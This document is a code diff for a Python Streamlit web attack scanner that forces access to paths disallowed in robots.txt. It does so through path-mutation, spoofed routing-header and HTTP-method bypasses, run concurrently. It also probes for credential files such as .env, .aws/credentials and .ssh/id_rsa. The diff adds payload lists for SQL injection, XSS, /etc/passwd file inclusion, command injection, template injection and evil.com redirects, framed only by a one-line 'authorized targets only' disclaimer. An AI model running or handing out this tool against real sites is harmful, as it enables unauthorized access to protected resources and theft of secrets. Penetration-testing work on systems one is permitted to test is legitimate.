@@ -1,16 +1,26 @@
+"""
+Zwanski Security Scanner v2 — Robots.txt / ACL Bypass Edition
+Fixes: missing methods, broken robots parsing, fake bypasses, no concurrency.
+Adds: real header/method bypasses, sitemap.xml discovery, threading, better evidence.
+
+Legal: authorized targets only.
+"""
+
 import streamlit as st
 import urllib.request
 import urllib.parse
 import urllib.error
-import urllib.robotparser
 import json
 import re
 import time
-from urllib.parse import urlparse, urljoin
+import xml.etree.ElementTree as ET
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urlparse
+from typing import Optional
 
 # ─── Page Config ──────────────────────────────────────────────────────────────
 st.set_page_config(
-    page_title="Zwanski Security Scanner",
+    page_title="Zwanski Security Scanner v2",
     page_icon="🛡️",
     layout="wide",
     initial_sidebar_state="expanded",
@@ -32,529 +42,639 @@ st.markdown("""
     .metric-card { background:#111827;border:1px solid #1e2a3a;border-radius:8px;padding:16px;text-align:center; }
     .metric-card .value { font-size:2rem;font-weight:800;font-family:'Syne',sans-serif; }
     .metric-card .label { color:#8b949e;font-size:.8rem;margin-top:4px; }
-    .disallowed-path { background:#ff4b4b11;border-left:3px solid #ff4b4b;padding:8px;margin:4px 0; }
-    .bypassed-path { background:#00ff9f11;border-left:3px solid #00ff9f;padding:8px;margin:4px 0; }
 </style>
 """, unsafe_allow_html=True)
 
 
-# ─── urllib-only HTTP (Pyodide/Streamlit Cloud safe) ──────────────────────────
+# ─── urllib-only HTTP ─────────────────────────────────────────────────────────
 class Response:
-    def __init__(self, status_code: int, text: str, headers: dict):
+    def __init__(self, status_code: int, text: str, headers: dict, final_url: str = ""):
         self.status_code = status_code
         self.text = text
         self.headers = {k.lower(): v for k, v in headers.items()}
         self.content = text.encode("utf-8", errors="replace")
+        self.final_url = final_url
 
 
-def http_get(url: str, timeout: int = 10) -> Response | None:
+DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
+
+
+def http_request(
+    url: str,
+    method: str = "GET",
+    extra_headers: Optional[dict] = None,
+    timeout: int = 10,
+    allow_redirects: bool = False,
+) -> Optional[Response]:
+    """Low-level HTTP with header + method control. No external deps."""
+    headers = {"User-Agent": DEFAULT_UA}
+    if extra_headers:
+        headers.update(extra_headers)
     try:
-        req = urllib.request.Request(
-            url, headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityAuditBot/1.0)"}
-        )
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        req = urllib.request.Request(url, headers=headers, method=method)
+        opener = urllib.request.build_opener()
+        if not allow_redirects:
+            # Disable auto-redirect to see raw response
+            class NoRedirect(urllib.request.HTTPRedirectHandler):
+                def redirect_request(self, *a, **kw):
+                    return None
+            opener = urllib.request.build_opener(NoRedirect)
+        with opener.open(req, timeout=timeout) as r:
             text = r.read().decode("utf-8", errors="replace")
-            return Response(r.status, text, dict(r.headers))
+            return Response(r.status, text, dict(r.headers), r.url)
     except urllib.error.HTTPError as e:
         try:
             text = e.read().decode("utf-8", errors="replace")
         except Exception:
             text = ""
-        return Response(e.code, text, dict(e.headers) if e.headers else {})
+        return Response(e.code, text, dict(e.headers) if e.headers else {}, url)
     except Exception:
         return None
 
 
-# ─── Robots.txt Parser with Bypass ─────────────────────────────────────────────
-class RobotsBypass:
-    def __init__(self, base_url: str):
-        self.base_url = base_url.rstrip('/')
-        parsed = urlparse(base_url)
-        self.robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"
-        self.disallowed_paths = []
-        self.allow_paths = []
-        self.raw_robots = ""
-        self._fetch_robots()
-    
-    def _fetch_robots(self):
-        """Fetch and parse robots.txt"""
-        resp = http_get(self.robots_url, timeout=5)
-        if resp and resp.status_code == 200:
-            self.raw_robots = resp.text
-            self._parse_robots(resp.text)
-    
-    def _parse_robots(self, content: str):
-        """Parse robots.txt for disallowed paths"""
-        lines = content.split('\n')
-        current_agent = None
-        disallowed_for_all = []
-        disallowed_specific = {}
-        
-        for line in lines:
-            line = line.strip().lower()
-            if line.startswith('user-agent:'):
-                current_agent = line.split(':', 1)[1].strip()
-                if current_agent not in disallowed_specific:
-                    disallowed_specific[current_agent] = []
-            elif line.startswith('disallow:') and current_agent:
-                path = line.split(':', 1)[1].strip()
-                if path:
-                    disallowed_specific[current_agent].append(path)
-                    if current_agent == '*':
-                        disallowed_for_all.append(path)
-            elif line.startswith('allow:') and current_agent:
-                path = line.split(':', 1)[1].strip()
-                if path:
-                    self.allow_paths.append(path)
-        
-        self.disallowed_paths = list(set(disallowed_for_all))
-        
-        # Add common disallowed patterns
-        for agent, paths in disallowed_specific.items():
-            if agent != '*':
-                self.disallowed_paths.extend(paths)
-        
-        self.disallowed_paths = list(set(self.disallowed_paths))
-    
-    def generate_bypass_payloads(self, path: str) -> list:
-        """Generate encoding bypasses for a disallowed path"""
-        bypasses = []
-        
-        # Clean the path
-        clean_path = path.lstrip('/')
-        
-        # Level 1: Basic URL encoding
-        level1 = urllib.parse.quote(clean_path)
-        bypasses.append({
-            'technique': 'URL Encoding',
-            'payload': level1,
-            'level': 1
-        })
-        
-        # Level 2: Double encoding (%2523 style)
-        level2 = level1.replace('%', '%25')
-        bypasses.append({
-            'technique': 'Double Encoding (%2523)',
-            'payload': level2,
-            'level': 2
-        })
-        
-        # Level 3: Triple encoding
-        level3 = level2.replace('%', '%25')
-        bypasses.append({
-            'technique': 'Triple Encoding',
-            'payload': level3,
-            'level': 3
-        })
-        
-        # Unicode bypasses
-        unicode_variants = [
-            clean_path.replace('/', '⁄'),  # Unicode slash
-            clean_path.replace('.', '․'),  # Unicode dot
-            clean_path.replace('a', 'а'),  # Cyrillic 'a'
-        ]
-        for variant in unicode_variants:
-            bypasses.append({
-                'technique': 'Unicode Homoglyph',
-                'payload': urllib.parse.quote(variant),
-                'level': 4
-            })
-        
-        # Path traversal tricks
-        traversal = [
-            f"....//{clean_path}",  # Double dot bypass
-            f"/./{clean_path}",     # Current dir bypass
-            f"///{clean_path}",     # Multiple slashes
-            f"/%2e/{clean_path}",   # Encoded dot
-            f"/%252e/{clean_path}", # Double encoded dot
-        ]
-        for trav in traversal:
-            bypasses.append({
-                'technique': 'Path Traversal',
-                'payload': trav,
-                'level': 5
-            })
-        
-        # Case manipulation
-        case_variants = [
-            clean_path.upper(),
-            clean_path.lower(),
-            clean_path.title(),
-            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(clean_path))
-        ]
-        for variant in case_variants:
-            bypasses.append({
-                'technique': 'Case Manipulation',
-                'payload': variant,
-                'level': 6
-            })
-        
-        # HTTP parameter pollution
-        hpp_bypass = f"{clean_path}?param=value#fragment"
-        bypasses.append({
-            'technique': 'HPP/Fragment',
-            'payload': hpp_bypass,
-            'level': 7
-        })
-        
-        # Null byte injection
-        null_byte = f"{clean_path}%00.jpg"
-        bypasses.append({
-            'technique': 'Null Byte',
-            'payload': null_byte,
-            'level': 8
-        })
-        
-        # URL encoding variations
-        encoding_variants = [
-            ''.join(f'%{ord(c):02x}' for c in clean_path),
-            ''.join(f'%{ord(c):02X}' for c in clean_path),
-            ''.join(f'%25{ord(c):02x}' for c in clean_path),
-        ]
-        for i, variant in enumerate(encoding_variants):
-            bypasses.append({
-                'technique': f'Full Encoding v{i+1}',
-                'payload': variant,
-                'level': 9 + i
-            })
-        
-        return bypasses
-    
-    def test_bypass(self, path: str, timeout: int = 10) -> dict:
-        """Test if a disallowed path can be bypassed"""
-        results = {
-            'original_path': path,
-            'disallowed': True,
-            'bypasses': [],
-            'successful_bypasses': []
-        }
-        
-        # First test direct access
-        direct_url = f"{self.base_url}/{path.lstrip('/')}"
-        direct_resp = http_get(direct_url, timeout)
-        
-        if direct_resp and direct_resp.status_code == 200:
-            results['disallowed'] = False
-            results['direct_accessible'] = True
-        
-        # Test bypass techniques
-        bypass_payloads = self.generate_bypass_payloads(path)
-        
-        for bypass in bypass_payloads:
-            test_url = f"{self.base_url}/{bypass['payload']}"
-            resp = http_get(test_url, timeout)
-            
-            result = {
-                'technique': bypass['technique'],
-                'payload': bypass['payload'],
-                'url': test_url,
-                'status_code': resp.status_code if resp else 'Error',
-                'success': False,
-                'evidence': []
-            }
-            
-            if resp:
-                if resp.status_code == 200:
-                    result['success'] = True
-                    result['evidence'].append("Access granted (200 OK)")
-                    
-                    # Check for sensitive content
-                    content = resp.text.lower()
-                    if 'password' in content or 'secret' in content:
-                        result['evidence'].append("Sensitive keywords found")
-                    if '<?php' in content:
-                        result['evidence'].append("PHP source exposed")
-                    if 'sql' in content and 'error' in content:
-                        result['evidence'].append("SQL error exposed")
-                    
-                    results['successful_bypasses'].append(result)
-                
-                elif resp.status_code == 403:
-                    result['evidence'].append("Still forbidden (403)")
-                elif resp.status_code == 404:
-                    result['evidence'].append("Not found (404)")
-                elif resp.status_code == 500:
-                    result['evidence'].append("Server error (500) - potential bypass")
-                    result['success'] = True
-                    results['successful_bypasses'].append(result)
-            
-            results['bypasses'].append(result)
-            time.sleep(0.1)  # Rate limiting
-        
-        return results
-
-
-# ─── Enhanced Scanner ──────────────────────────────────────────────────────────
-class SecurityScanner:
-    def __init__(self, base_url: str, timeout: int = 10, rate_limit: float = 0.3):
+# ─── Robots.txt Parser (case-preserving, sitemap-aware) ───────────────────────
+class RobotsParser:
+    def __init__(self, base_url: str, timeout: int = 10):
         self.base_url = base_url.rstrip("/")
+        parsed = urlparse(base_url)
+        self.origin = f"{parsed.scheme}://{parsed.netloc}"
+        self.robots_url = f"{self.origin}/robots.txt"
+        self.sitemap_url = f"{self.origin}/sitemap.xml"
+        self.disallowed_paths: list[str] = []
+        self.allowed_paths: list[str] = []
+        self.sitemaps: list[str] = []
+        self.sitemap_urls: list[str] = []
+        self.raw_robots = ""
         self.timeout = timeout
-        self.rate_limit = rate_limit
-        self.robots_bypass = RobotsBypass(base_url)
+        self._fetch_robots()
+        self._fetch_sitemaps()
+
+    def _fetch_robots(self):
+        resp = http_request(self.robots_url, timeout=self.timeout)
+        if not resp or resp.status_code != 200:
+            return
+        self.raw_robots = resp.text
+        self._parse_robots(resp.text)
+
+    def _parse_robots(self, content: str):
+        """Case-preserving parser. Only directive names are lowered, not paths."""
+        current_agents: list[str] = []
+        disallow_by_agent: dict[str, list[str]] = {}
+        allow_by_agent: dict[str, list[str]] = {}
+
+        for raw in content.splitlines():
+            line = raw.split("#", 1)[0].strip()
+            if not line or ":" not in line:
+                continue
+            key, value = line.split(":", 1)
+            key = key.strip().lower()
+            value = value.strip()  # preserve case on paths
+
+            if key == "user-agent":
+                # New block -- if previous agents had no directives yet, keep them grouped
+                current_agents = [value] if not current_agents or value else current_agents
+                # Simpler: track last-seen agent
+                current_agents = [value]
+                disallow_by_agent.setdefault(value, [])
+                allow_by_agent.setdefault(value, [])
+            elif key == "disallow" and current_agents:
+                if value:
+                    for a in current_agents:
+                        disallow_by_agent.setdefault(a, []).append(value)
+            elif key == "allow" and current_agents:
+                if value:
+                    for a in current_agents:
+                        allow_by_agent.setdefault(a, []).append(value)
+            elif key == "sitemap":
+                self.sitemaps.append(value)
+
+        # Merge: all disallow paths from any agent are potentially interesting for pentest
+        all_disallow = []
+        for paths in disallow_by_agent.values():
+            all_disallow.extend(paths)
+        self.disallowed_paths = sorted(set(all_disallow))
+
+        all_allow = []
+        for paths in allow_by_agent.values():
+            all_allow.extend(paths)
+        self.allowed_paths = sorted(set(all_allow))
+
+    def _fetch_sitemaps(self):
+        """Pull URLs from declared sitemaps + default /sitemap.xml."""
+        targets = list(self.sitemaps) or [self.sitemap_url]
+        for sm_url in targets[:5]:  # cap
+            resp = http_request(sm_url, timeout=self.timeout)
+            if not resp or resp.status_code != 200:
+                continue
+            try:
+                # strip namespace for simpler xpath
+                xml_text = re.sub(r'\sxmlns="[^"]+"', "", resp.text, count=1)
+                root = ET.fromstring(xml_text)
+                for loc in root.iter("loc"):
+                    if loc.text:
+                        self.sitemap_urls.append(loc.text.strip())
+            except ET.ParseError:
+                continue
+        self.sitemap_urls = sorted(set(self.sitemap_urls))[:200]
+
+
+# ─── Real Bypass Techniques ───────────────────────────────────────────────────
+class BypassEngine:
+    """
+    Focus on bypasses that actually work against real stacks:
+      - Header-based (X-Original-URL, X-Rewrite-URL, X-Forwarded-For)
+      - Trailing dot / space / slash
+      - Nginx alias / off-by-slash tricks
+      - Method override (HEAD, OPTIONS, ACL, PROPFIND)
+      - Case manipulation (only on case-insensitive servers like IIS)
+      - Unicode normalization (NFKC collapses)
+      - Double URL encoding of the slash separator
+    """
 
     @staticmethod
-    def encode_payload(payload: str, level: int = 1) -> str:
-        encoded = urllib.parse.quote(payload, safe="")
-        for _ in range(level - 1):
-            encoded = encoded.replace("%", "%25")
-        return encoded
+    def path_mutations(path: str) -> list[tuple[str, str]]:
+        """Returns list of (technique, mutated_path). path starts with /."""
+        p = path if path.startswith("/") else "/" + path
+        clean = p.lstrip("/")
+        muts = [
+            ("trailing_slash", p + "/"),
+            ("trailing_dot", p + "."),
+            ("trailing_space_encoded", p + "%20"),
+            ("trailing_semicolon", p + ";"),
+            ("trailing_questionmark", p + "?"),
+            ("trailing_hash", p + "#"),
+            ("double_slash_prefix", "//" + clean),
+            ("dot_slash_prefix", "/./" + clean),
+            ("case_upper", "/" + clean.upper()),
+            ("case_lower", "/" + clean.lower()),
+            ("encoded_slash", "/" + urllib.parse.quote(clean, safe="")),
+            ("double_encoded_slash", "/" + urllib.parse.quote(urllib.parse.quote(clean, safe=""), safe="")),
+            ("nginx_offbyslash", p.rstrip("/") + "../"),
+            ("path_param_injection", p + ";foo=bar"),
+            ("utf8_overlong", "/" + clean.replace("/", "%c0%af")),
+        ]
+        return muts
 
-    def _all_encodings(self, value: str) -> list:
+    @staticmethod
+    def header_bypasses(path: str) -> list[tuple[str, dict]]:
+        """Headers that some reverse proxies / frameworks honor for internal routing."""
+        p = path if path.startswith("/") else "/" + path
         return [
-            {"original": value, "encoded": self.encode_payload(value, lvl), "level": lvl}
-            for lvl in (1, 2, 3, 4)
+            ("X-Original-URL", {"X-Original-URL": p}),
+            ("X-Rewrite-URL", {"X-Rewrite-URL": p}),
+            ("X-Override-URL", {"X-Override-URL": p}),
+            ("X-Forwarded-For", {"X-Forwarded-For": "127.0.0.1"}),
+            ("X-Real-IP", {"X-Real-IP": "127.0.0.1"}),
+            ("X-Forwarded-Host", {"X-Forwarded-Host": "localhost"}),
+            ("X-Host", {"X-Host": "localhost"}),
+            ("Referer_same_origin", {"Referer": "/"}),
+            ("Client-IP", {"Client-IP": "127.0.0.1"}),
+            ("True-Client-IP", {"True-Client-IP": "127.0.0.1"}),
         ]
 
-    PAYLOADS = {
-        "sqli": ["' OR '1'='1", "1' UNION SELECT NULL--", "1 AND 1=1--", "' OR 1=1#"],
-        "xss": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"],
-        "lfi": ["../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index"],
-        "rce": ["; id", "| whoami", "$(id)"],
-        "open_redirect": ["//evil.com", "https://evil.com"],
-    }
+    @staticmethod
+    def method_bypasses() -> list[str]:
+        """HTTP methods sometimes not covered by ACLs (classic on Tomcat, old Apache)."""
+        return ["GET", "POST", "HEAD", "OPTIONS", "TRACE", "ACL", "PROPFIND", "PURGE"]
 
+
+# ─── Scanner ──────────────────────────────────────────────────────────────────
+class SecurityScanner:
     HIDDEN_PATHS = [
-        ".env", ".git/config", ".htaccess", "web.config",
+        ".env", ".git/config", ".git/HEAD", ".htaccess", "web.config",
         "wp-config.php", "config.php", "config.yml", "settings.py",
         "db.php", "database.php", "backup.sql", "dump.sql", "db.sql",
-        "backup.zip", "www.zip", "backup.tar.gz",
+        "backup.zip", "www.zip", "backup.tar.gz", "site.tar.gz",
         "admin", "admin/login", "administrator", "wp-admin", "panel",
         "phpinfo.php", "info.php", "test.php", "debug.php",
         "error.log", "access.log", "log.txt",
-        "api/v1", "api/users", "api/admin", "api/keys",
-        "graphql", "swagger", "swagger-ui.html", "openapi.json",
-        "actuator", "actuator/env", "metrics", "health",
+        "api/v1", "api/users", "api/admin", "api/keys", "api/docs",
+        "graphql", "swagger", "swagger-ui.html", "openapi.json", "v2/api-docs",
+        "actuator", "actuator/env", "actuator/health", "actuator/mappings",
+        "metrics", "health", "server-status", "server-info",
         ".aws/credentials", ".ssh/id_rsa", "id_rsa",
+        ".DS_Store", ".vscode/settings.json", ".idea/workspace.xml",
+        "Dockerfile", "docker-compose.yml", "Jenkinsfile",
     ]
 
-    SQL_ERRORS = ["sql syntax","mysql error","ora-","postgresql error","sqlite",
-                  "microsoft sql","odbc driver","unclosed quotation","syntax error"]
-    LFI_INDICATORS = ["root:x:","daemon:","/bin/bash","uid=","gid=","[boot loader]"]
-    DB_PATTERNS = ["dbname=","mysql_connect","mysqli_connect","pdo","connectionstring","jdbc:"]
+    SENSITIVE_KEYWORDS = [
+        "password", "passwd", "secret", "api_key", "apikey", "private_key",
+        "aws_access_key", "AKIA", "BEGIN RSA", "BEGIN OPENSSH",
+        "mysql_connect", "jdbc:", "mongodb://", "postgres://",
+        "<?php", "<%@", "DEBUG = True",
+    ]
 
-    def _analyse(self, resp: Response) -> tuple:
-        ev = []
-        content = resp.text.lower()
-        for e in self.SQL_ERRORS:
-            if e in content: ev.append(f"SQL error: `{e}`")
-        for i in self.LFI_INDICATORS:
-            if i in content: ev.append(f"LFI indicator: `{i}`")
-        for p in self.DB_PATTERNS:
-            if p in content: ev.append(f"DB pattern: `{p}`")
-        if "<?php" in resp.text or "<?=" in resp.text:
-            ev.append("PHP source code exposed")
-        if "password" in content and "username" in content:
-            ev.append("Potential credentials in response")
-        for hdr in ("x-powered-by","x-aspnet-version","x-generator","server"):
+    def __init__(
+        self,
+        base_url: str,
+        timeout: int = 10,
+        rate_limit: float = 0.1,
+        workers: int = 10,
+    ):
+        self.base_url = base_url.rstrip("/")
+        self.timeout = timeout
+        self.rate_limit = rate_limit
+        self.workers = workers
+        self.robots = RobotsParser(base_url, timeout=timeout)
+        self.bypass = BypassEngine()
+
+    # ── helpers ────────────────────────────────────────────────────────────
+    def _analyze_response(self, resp: Response) -> list[str]:
+        evidence = []
+        if not resp:
+            return evidence
+        body_sample = resp.text[:20000].lower()
+        body_raw = resp.text[:20000]
+        for kw in self.SENSITIVE_KEYWORDS:
+            if kw.lower() in body_sample or kw in body_raw:
+                evidence.append(f"Sensitive content: `{kw}`")
+        if "root:x:" in body_sample or "daemon:" in body_sample:
+            evidence.append("LFI indicator (/etc/passwd pattern)")
+        for hdr in ("x-powered-by", "x-aspnet-version", "server"):
             if hdr in resp.headers:
-                ev.append(f"Header disclosure → {hdr}: {resp.headers[hdr]}")
-        return bool(ev), ev
+                evidence.append(f"Header: {hdr}={resp.headers[hdr]}")
+        return evidence
 
-    def _get(self, url: str) -> Response | None:
-        resp = http_get(url, self.timeout)
-        time.sleep(self.rate_limit)
-        return resp
+    def _baseline(self, path: str) -> Optional[Response]:
+        """Get the baseline forbidden response for a path."""
+        url = f"{self.base_url}{path if path.startswith('/') else '/' + path}"
+        return http_request(url, timeout=self.timeout)
+
+    def _is_bypass_success(self, baseline: Optional[Response], test: Optional[Response]) -> bool:
+        """
+        A bypass succeeds when:
+          - baseline returns 401/403/404 AND test returns 200/301/302
+          - OR response body length differs significantly and test is 2xx
+        """
+        if not test:
+            return False
+        if test.status_code in (200, 201, 202, 204):
+            if baseline is None or baseline.status_code in (401, 403, 404, 405):
+                return True
+            # Content size delta > 30%
+            if baseline.content and test.content:
+                delta = abs(len(test.content) - len(baseline.content))
+                if delta / max(len(baseline.content), 1) > 0.3:
+                    return True
+        return False
+
+    # ── robots bypass ──────────────────────────────────────────────────────
+    def _test_single_bypass(self, path: str, baseline: Optional[Response]) -> dict:
+        out = {
+            "path": path,
+            "baseline_status": baseline.status_code if baseline else None,
+            "successful_bypasses": [],
+            "attempts": 0,
+        }
+        tasks = []
+
+        # Path mutations
+        for technique, mutated in self.bypass.path_mutations(path):
+            tasks.append(("path_mutation", technique, mutated, "GET", {}))
+
+        # Header bypasses (point to /, inject target path via header)
+        for technique, headers in self.bypass.header_bypasses(path):
+            tasks.append(("header_bypass", technique, "/", "GET", headers))
+
+        # Method bypasses
+        for method in self.bypass.method_bypasses():
+            if method == "GET":
+                continue
+            tasks.append(("method_bypass", method, path, method, {}))
+
+        out["attempts"] = len(tasks)
+
+        with ThreadPoolExecutor(max_workers=self.workers) as pool:
+            futures = {}
+            for kind, tech, url_path, method, headers in tasks:
+                url = f"{self.base_url}{url_path if url_path.startswith('/') else '/' + url_path}"
+                fut = pool.submit(http_request, url, method, headers, self.timeout)
+                futures[fut] = (kind, tech, url, method, headers)
+
+            for fut in as_completed(futures):
+                kind, tech, url, method, headers = futures[fut]
+                resp = fut.result()
+                if self._is_bypass_success(baseline, resp):
+                    ev = self._analyze_response(resp)
+                    out["successful_bypasses"].append({
+                        "kind": kind,
+                        "technique": tech,
+                        "method": method,
+                        "url": url,
+                        "headers": headers,
+                        "status": resp.status_code,
+                        "size": len(resp.content),
+                        "evidence": ev,
+                    })
+        return out
 
     def scan_robots_bypass(self, progress_cb=None) -> dict:
-        """Main bypass scanner - forces access to disallowed paths"""
+        paths = [p for p in self.robots.disallowed_paths if p and p != "/"]
         results = {
-            'robots_url': self.robots_bypass.robots_url,
-            'robots_content': self.robots_bypass.raw_robots,
-            'disallowed_paths': self.robots_bypass.disallowed_paths,
-            'bypass_results': [],
-            'total_disallowed': len(self.robots_bypass.disallowed_paths),
-            'successful_bypasses': 0,
-            'critical_findings': []
+            "robots_url": self.robots.robots_url,
+            "robots_content": self.robots.raw_robots,
+            "sitemaps": self.robots.sitemaps,
+            "sitemap_urls_count": len(self.robots.sitemap_urls),
+            "sitemap_urls_sample": self.robots.sitemap_urls[:20],
+            "disallowed_paths": paths,
+            "total_disallowed": len(paths),
+            "bypass_results": [],
+            "successful_bypass_count": 0,
+            "critical_findings": [],
         }
-        
-        if not self.robots_bypass.disallowed_paths:
+        if not paths:
             return results
-        
-        total = len(self.robots_bypass.disallowed_paths)
-        
-        for i, path in enumerate(self.robots_bypass.disallowed_paths):
-            # Skip empty paths
-            if not path or path == '/':
-                continue
-            
-            bypass_result = self.robots_bypass.test_bypass(path, self.timeout)
-            
-            if bypass_result.get('successful_bypasses'):
-                results['successful_bypasses'] += 1
-                
-                # Check for critical findings
-                for success in bypass_result['successful_bypasses']:
-                    if any(keyword in str(success).lower() for keyword in 
-                           ['admin', 'config', 'backup', '.env', 'password', 'secret']):
-                        results['critical_findings'].append({
-                            'path': path,
-                            'technique': success['technique'],
-                            'url': success['url'],
-                            'evidence': success['evidence']
-                        })
-            
-            results['bypass_results'].append(bypass_result)
-            
+
+        for i, path in enumerate(paths):
+            baseline = self._baseline(path)
+            result = self._test_single_bypass(path, baseline)
+            results["bypass_results"].append(result)
+
+            for success in result["successful_bypasses"]:
+                results["successful_bypass_count"] += 1
+                pl = path.lower()
+                if any(k in pl for k in ("admin", "config", "backup", "env", ".git", "api", "internal", "private")):
+                    results["critical_findings"].append({
+                        "path": path,
+                        "technique": success["technique"],
+                        "kind": success["kind"],
+                        "url": success["url"],
+                        "status": success["status"],
+                        "evidence": success["evidence"],
+                    })
+
             if progress_cb:
-                progress_cb((i + 1) / total)
-        
+                progress_cb((i + 1) / len(paths))
+            time.sleep(self.rate_limit)
         return results
 
-    def scan_hidden_files_aggressive(self, progress_cb=None) -> list:
-        """Aggressive hidden file scanner with all encoding bypasses"""
-        found = []
+    # ── hidden files ───────────────────────────────────────────────────────
+    def scan_hidden_files(self, progress_cb=None) -> list:
         total = len(self.HIDDEN_PATHS)
-        
-        for i, path in enumerate(self.HIDDEN_PATHS):
-            # Try all encoding levels
-            for level in [1, 2, 3]:
-                encoded = self.encode_payload(path, level)
-                url = f"{self.base_url}/{encoded}"
-                resp = self._get(url)
-                
-                if resp is not None and resp.status_code in (200, 403, 500):
-                    vuln, ev = self._analyse(resp)
-                    
-                    # Additional checks for encoded bypass
-                    bypass_success = False
-                    if level > 1 and resp.status_code == 200:
-                        bypass_success = True
-                        ev.append(f"Bypassed using level {level} encoding")
-                    
-                    found.append({
-                        "path": path,
-                        "encoded": encoded,
-                        "url": url,
-                        "encoding_level": level,
-                        "status": resp.status_code,
-                        "vulnerable": vuln,
-                        "bypass_success": bypass_success,
-                        "evidence": ev,
-                        "size": len(resp.content),
-                    })
-            
-            # Try with %2523 prefix
-            encoded_2523 = f"%2523{path}"
-            url = f"{self.base_url}/{encoded_2523}"
-            resp = self._get(url)
-            if resp and resp.status_code in (200, 403):
-                vuln, ev = self._analyse(resp)
-                found.append({
+        found = []
+
+        def probe(path):
+            url = f"{self.base_url}/{path}"
+            resp = http_request(url, timeout=self.timeout)
+            if not resp:
+                return None
+            if resp.status_code in (200, 301, 302, 401, 403):
+                return {
                     "path": path,
-                    "encoded": encoded_2523,
                     "url": url,
-                    "encoding_level": "2523",
                     "status": resp.status_code,
-                    "vulnerable": vuln,
-                    "bypass_success": resp.status_code == 200,
-                    "evidence": ev,
                     "size": len(resp.content),
-                })
-            
-            if progress_cb:
-                progress_cb((i + 1) / total)
-        
+                    "evidence": self._analyze_response(resp) if resp.status_code == 200 else [],
+                }
+            return None
+
+        with ThreadPoolExecutor(max_workers=self.workers) as pool:
+            futures = {pool.submit(probe, p): p for p in self.HIDDEN_PATHS}
+            for i, fut in enumerate(as_completed(futures)):
+                r = fut.result()
+                if r:
+                    found.append(r)
+                if progress_cb:
+                    progress_cb((i + 1) / total)
         return found
 
+    # ── parameter injection (restored) ─────────────────────────────────────
+    PAYLOADS = {
+        "sqli": ["' OR '1'='1", "1' UNION SELECT NULL--", "1 AND 1=1--", "' OR 1=1#"],
+        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"],
+        "lfi": ["../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index"],
+        "rce": ["; id", "| whoami", "$(id)", "`id`"],
+        "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
+        "open_redirect": ["//evil.com", "https://evil.com", "/\\evil.com"],
+    }
+    SQL_ERRORS = ["sql syntax", "mysql error", "ora-", "postgresql error", "sqlite",
+                  "microsoft sql", "odbc driver", "unclosed quotation", "syntax error"]
 
-# ─── Session State Defaults ───────────────────────────────────────────────────
-for _k in ("scan_done", "robots_results", "hidden_files", "injections", "endpoints"):
-    if _k not in st.session_state:
-        st.session_state[_k] = {} if _k == "robots_results" else ([] if _k != "scan_done" else False)
+    def scan_parameter_injection(self, param: str, progress_cb=None) -> list:
+        """Test injection payloads against ?param=..."""
+        findings = []
+        all_tests = []
+        for category, payloads in self.PAYLOADS.items():
+            for p in payloads:
+                all_tests.append((category, p))
+        total = len(all_tests)
+
+        def probe(category, payload):
+            encoded = urllib.parse.quote(payload, safe="")
+            url = f"{self.base_url}/?{param}={encoded}"
+            resp = http_request(url, timeout=self.timeout)
+            if not resp:
+                return None
+            body = resp.text.lower()
+            ev = []
+            if category == "sqli":
+                for e in self.SQL_ERRORS:
+                    if e in body:
+                        ev.append(f"SQL error: `{e}`")
+            elif category == "xss":
+                if payload.lower() in resp.text.lower():
+                    ev.append("Payload reflected unencoded")
+            elif category == "lfi":
+                if "root:x:" in body or "daemon:" in body:
+                    ev.append("/etc/passwd contents returned")
+            elif category == "ssti":
+                if "49" in resp.text:
+                    ev.append("Template expression evaluated (7*7=49)")
+            elif category == "rce":
+                if re.search(r"uid=\d+.*gid=\d+", resp.text):
+                    ev.append("Command output returned (uid=/gid=)")
+            elif category == "open_redirect":
+                loc = resp.headers.get("location", "")
+                if "evil.com" in loc:
+                    ev.append(f"Redirect to attacker-controlled: {loc}")
+            if ev:
+                return {
+                    "category": category,
+                    "payload": payload,
+                    "encoded": encoded,
+                    "url": url,
+                    "status": resp.status_code,
+                    "evidence": ev,
+                }
+            return None
+
+        with ThreadPoolExecutor(max_workers=self.workers) as pool:
+            futures = {pool.submit(probe, c, p): (c, p) for c, p in all_tests}
+            for i, fut in enumerate(as_completed(futures)):
+                r = fut.result()
+                if r:
+                    findings.append(r)
+                if progress_cb:
+                    progress_cb((i + 1) / total)
+        return findings
+
+    # ── endpoint discovery from sitemap + robots ───────────────────────────
+    def scan_endpoints(self, progress_cb=None) -> list:
+        """Probe URLs discovered via sitemap.xml and robots allow/disallow."""
+        candidates = set()
+        for p in self.robots.allowed_paths + self.robots.disallowed_paths:
+            if p and p != "/":
+                candidates.add(f"{self.base_url}{p if p.startswith('/') else '/' + p}")
+        for u in self.robots.sitemap_urls:
+            candidates.add(u)
+
+        candidates = list(candidates)[:100]
+        if not candidates:
+            return []
+        total = len(candidates)
+        results = []
+
+        def probe(url):
+            resp = http_request(url, timeout=self.timeout)
+            if not resp:
+                return None
+            if resp.status_code in (200, 301, 302, 401, 403):
+                ev = self._analyze_response(resp) if resp.status_code == 200 else []
+                return {
+                    "endpoint": urlparse(url).path,
+                    "url": url,
+                    "status": resp.status_code,
+                    "size": len(resp.content),
+                    "evidence": ev,
+                }
+            return None
+
+        with ThreadPoolExecutor(max_workers=self.workers) as pool:
+            futures = {pool.submit(probe, u): u for u in candidates}
+            for i, fut in enumerate(as_completed(futures)):
+                r = fut.result()
+                if r:
+                    results.append(r)
+                if progress_cb:
+                    progress_cb((i + 1) / total)
+        return results
+
+
+# ─── Session State ────────────────────────────────────────────────────────────
+_DEFAULTS = {
+    "scan_done": False,
+    "robots_results": {},
+    "hidden_files": [],
+    "injections": [],
+    "endpoints": [],
+}
+for k, v in _DEFAULTS.items():
+    if k not in st.session_state:
+        st.session_state[k] = v
 
 
